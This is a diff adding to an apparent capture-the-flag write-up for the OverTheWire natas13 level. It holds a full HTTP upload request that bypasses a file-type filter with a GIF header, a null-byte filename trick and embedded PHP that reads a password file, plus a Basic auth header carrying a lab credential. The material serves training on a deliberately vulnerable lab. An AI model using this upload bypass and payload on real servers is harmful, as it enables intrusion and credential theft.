@@ -426,6 +426,39 @@ filename to poof2.phpA.gif. We'll then open the hex view of Burpsuite and change
 character (41) to a null byte (00). This will have the filter read the file as a GIF, but
 when uploaded, php will be parsed as the end of the filename.
 
+```
+POST /index.php HTTP/1.1
+Host: natas13.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas13.natas.labs.overthewire.org/index.php
+Content-Type: multipart/form-data; boundary=---------------------------1096181585261691482202228918
+Content-Length: 625
+Authorization: Basic bmF0YXMxMzpqbUxUWTBxaVBaQmJhS2M5MzQxY3FQUVpCSnY3TVFiWQ==
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------1096181585261691482202228918
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+1000
+-----------------------------1096181585261691482202228918
+Content-Disposition: form-data; name="filename"
+
+yzow7qgsuk.php
+-----------------------------1096181585261691482202228918
+Content-Disposition: form-data; name="uploadedfile"; filename="poof2.phpA.gif"
+Content-Type: image/gif
+
+GIF89a  ò  KMUUUKV\JWd]W         !þU<?php
+$password = file_get_contents('/etc/natas_webpass/natas14');
+echo $password;
+?> !ù	  ,       8*! $ ;
+-----------------------------1096181585261691482202228918--
+```
+
 
 
 
